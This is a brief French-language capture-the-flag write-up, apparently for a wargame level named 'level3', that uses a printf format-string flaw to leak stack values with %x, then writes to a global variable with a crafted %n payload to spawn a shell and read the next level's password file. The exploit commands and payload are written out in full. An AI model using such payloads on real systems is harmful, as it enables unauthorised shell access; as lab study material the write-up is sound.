Dans la decompilation on remarque que la variable m est global mais qu'elle conditionne l'acces au shell
Donc il va falloir la modifier

il y a un printf qui passe directement une variable en parametre donc qui sera considerer comme un format printf, la faille est la

avec %x on peut afficher les valeur de la stack donc on va essayer de trouver ou est stocker l'adresse de notre entrer

python -c 'print "eeee %x %x %x %x"' | ./level3 

on obtient : eeee 200 b7fd1ac0 b7ff37d0 65656565 
(65656565 4eme place)

ce qui veut dire que l'entre est stocke a la 4eme place donc nous allons premierement y placer l'adresse de la variable m qui est 0804988c.

il y a le format %n avec printf qui permet de placer le nombre de caractere de printf a la enieme emplacement de la stack qui pointera vers l'adresse de m

donc nous faisons simplement :

python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' > /tmp/payload

cat /tmp/payload - | ./level3

Le shell est executé

cat /home/user/level4/.pass



